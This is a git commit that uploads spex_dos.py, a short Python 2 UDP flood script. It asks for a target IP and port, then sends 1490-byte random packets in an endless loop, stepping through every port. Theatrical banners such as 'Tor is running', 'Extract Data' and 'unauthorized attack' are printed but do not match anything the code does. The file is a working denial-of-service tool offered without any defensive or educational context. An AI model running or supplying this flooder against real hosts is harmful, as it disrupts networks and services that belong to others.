7ee26c64d20b752250727e6f2e86d0ec1b89f4b3
spex1477 <68296629+spex1477@users.noreply.github.com>
2021-08-31 19:45:17 +0300

    Add files via upload

---
+++ spex_dos.py
@@ -0,0 +1,48 @@
+import sys
+import os
+import time
+import socket
+import random
+
+#Code Time
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
+##############
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+#############
+                             
+os.system("clear")
+os.system("figlet SPEX  MARKA")
+print
+print "Author   : An4rChy3zyr0"
+print
+ip = raw_input("IP Target : ")
+port = input("Port       : ")
+
+os.system("clear")                 
+os.system("figlet Loading")
+time.sleep(4)                         
+print "     *Tor is running*    "
+time.sleep(3)
+print "     *Extract Data*      "
+time.sleep(3)
+print " *unauthorized attack*   "
+time.sleep(3)
+print "  *no system is safe!*   "
+time.sleep(3)
+print "     *ATTACK UPLOAD*     "
+time.sleep(2)
+sent = 0
+while True:
+     sock.sendto(bytes, (ip,port))
+     sent = sent + 1
+     port = port + 1
+     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+     if port == 65534:
+       port = 1
